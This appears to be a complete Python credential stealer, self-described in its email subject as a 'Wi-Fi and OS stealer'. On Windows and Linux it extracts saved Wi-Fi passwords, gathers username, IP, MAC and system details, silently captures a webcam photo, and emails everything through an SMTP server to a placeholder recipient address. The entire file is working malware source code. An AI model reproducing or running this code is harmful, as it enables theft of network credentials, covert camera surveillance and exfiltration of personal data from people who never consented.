"""
        ██▄██ ▄▀▄ █▀▄ █▀▀ . █▀▄ █░█
        █░▀░█ █▄█ █░█ █▀▀ . █▀▄ ▀█▀
        ▀░░░▀ ▀░▀ ▀▀░ ▀▀▀ . ▀▀░ ░▀░

▒▐█▀█─░▄█▀▄─▒▐▌▒▐▌░▐█▀▀▒██░░░░▐█▀█▄─░▄█▀▄─▒█▀█▀█
▒▐█▄█░▐█▄▄▐█░▒█▒█░░▐█▀▀▒██░░░░▐█▌▐█░▐█▄▄▐█░░▒█░░
▒▐█░░░▐█─░▐█░▒▀▄▀░░▐█▄▄▒██▄▄█░▐█▄█▀░▐█─░▐█░▒▄█▄░
"""
import configparser
import smtplib as smtp
import ssl
import os
import subprocess
from collections import namedtuple
import cv2
import psutil
from datetime import datetime
import getpass
import socket
from uuid import getnode as get_mac
import platform
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication


def get_windows_wifi_passwords():
    """
    Returns all Windows saved WIFI passwords

    :return: WiFi names and passwords
    """

    def get_ssids(decode_format: str, profile: str):
        """
        Returns all ssids
        :param decode_format: decode format
        :param profile: profile search

        :return: array with WiFi ssids
        """
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']
                                       ).decode(decode_format).split('\n')
        wifis = [line.split(':')[1][1:-1] for line in data
                 if profile in line or ""]
        return wifis

    def get_wifi_passwords(decode_format: str, profile: str, key: str) -> str:
        """
        Retrieves all saved WIFI passwords
        :param decode_format: decode format
        :param profile: profile search
        :param key: key search

        :return: email text with WiFi ssids and passwords
        """
        wifis = get_ssids(decode_format, profile)
        email_text = ''
        file = 'wifi.txt'
        for wifi in wifis:
            results = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']
                        ).decode(decode_format).split('\n')
            results = [line.split(':')[1][1:-1] for line in results
                       if key in line]
            try:
                email_text += f'WiFi: {wifi}, Password: {results[0]}\n'
                with open(file, 'a') as f:
                    f.write(f'WiFi: {wifi}, Password: {results[0]}\n')
            except IndexError:
                email_text += f'WiFi: {wifi}, Password not found\n'
                with open(file, 'a') as f:
                    f.write(f'WiFi: {wifi}, Password not found\n')
        return email_text

    def get_windows_default_language() -> str:
        """
        Detects the Windows default language

        :return: Windows default language
        """
        return os.environ['LANG']

    def start() -> str:
        """
        Starts the program depending on the default Windows language

        :return: email text with WiFi ssids and passwords
        """
        language = get_windows_default_language()
        decode = 'utf-8'
        profile = 'All User Profile'
        key = 'Key Content'
        if 'ru' in language:
            decode = 'cp866'
            profile = 'Все профили пользователей'
            key = 'Содержимое ключа'
        return get_wifi_passwords(decode, profile, key)

    return start()


def get_os_info():
    """
    Get IP, MAC, Username, OS

    :return: ip, mac, username, os
    """
    name = getpass.getuser()
    ip = socket.gethostbyname(socket.getfqdn())
    mac = get_mac()
    os = platform.uname()
    return name, ip, mac, os


def time():
    """
    Get timezone and time

    :return: timezone, time
    """
    zone = psutil.boot_time()
    time = datetime.fromtimestamp(zone)
    return zone, time


def cpu():
    """
    Get CPU frequency

    :return: CPU frequency
    """
    cpu_freq = psutil.cpu_freq()
    return cpu_freq


def take_photo():
    """
    Takes and saves a photo
    """
    camera = cv2.VideoCapture(0)
    _, image = camera.read()
    cv2.imwrite('photo.png', image)
    del(camera)


def get_linux_wifi_passwords():
    """
    Returns all Linux saved WIFI ssids and passwords

    :return: email text with WiFi ssids and passwords
    """
    net_path = '/etc/NetworkManager/system-connections/'
    fields = ['ssid', 'auth-alg', 'key-mgmt', 'psk']
    Profile = namedtuple('Profile', [f.replace('-', '_')
                                     for f in fields])
    email_text = ''
    output_file = 'wifi.txt'
    for file in os.listdir(net_path):
        data = {k.replace('-', '_'): None
                for k in fields}
        config = configparser.ConfigParser()
        config.read(os.path.join(net_path, file))
        for _, section in config.items():
            for k, v in section.items():
                if k in fields:
                    data[k.replace('-', '_')] = v
        profile = Profile(**data)
        try:
            email_text += f'WiFi: {profile.ssid}, Password: {profile.psk}\n'
            with open(output_file, 'a') as f:
                f.write(f'WiFi: {profile.ssid}, Password: {profile.psk}\n')
        except IndexError:
            email_text += f'WiFi: {profile.ssid}, Password not found\n'
            with open(output_file, 'a') as f:
                f.write(f'WiFi: {profile.ssid}, Password not found\n')
    return email_text


def send_email(email_text: str):
    """
    Sends me email with WiFi data

    :param email_text: email text to send
    """
    email = '<email>@mail.ru'
    password = '<password>'
    dest_email = '<destination>@mail.ru'
    subject = 'Wi-Fi and OS stealer'

    message = MIMEMultipart()
    message['From'] = email
    message['To'] = dest_email
    message['Subject'] = subject

    message.attach(MIMEText(email_text, 'plain'))

    filename = 'wifi.txt'

    with open(filename, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        'Content-Disposition',
        f'attachment; filename= {filename}',
    )

    part_photo = MIMEApplication(open('photo.png', 'rb').read())
    part_photo.add_header('Content-Disposition', 'attachment',
                          filename='photo.png')

    message.attach(part)
    message.attach(part_photo)
    text = message.as_string()

    context = ssl.create_default_context()
    with smtp.SMTP(host='smtp.mail.ru', port=587) as server:
        server.starttls(context=context)
        server.ehlo()
        server.login(email, password)
        server.sendmail(email, dest_email, text)


def get_system_info():
    """
    Get all system info

    :return: system info
    """

    name, ip, mac, os = get_os_info()
    timezone, current_time = time()
    cpu_freq = cpu()
    output_file = 'wifi.txt'
    open(output_file, 'w').close()
    email = f'Username: {name}\n' + \
            f'IP: {ip}\n' + \
            f'MAC: {mac}\n' + \
            f'OS: {os}\n' + \
            f'Timezone: {timezone}\n' + \
            f'Current time: {current_time}\n' + \
            f'CPU: {cpu_freq}\n'
    with open(output_file, 'a') as f:
        f.write(email)
    return email


def check_os_system():
    """
    Checks what OS we are on
    """
    if os.name == 'nt':
        take_photo()
        email_text = get_system_info()
        email_text += '\n' + get_windows_wifi_passwords()
        send_email(email_text)
    elif os.name == 'posix':
        take_photo()
        email_text = get_system_info()
        email_text += '\n' + get_linux_wifi_passwords()
        send_email(email_text)
    else:
        raise NotImplemented('Only Windows or Linux =(')


if __name__ == "__main__":
    check_os_system()
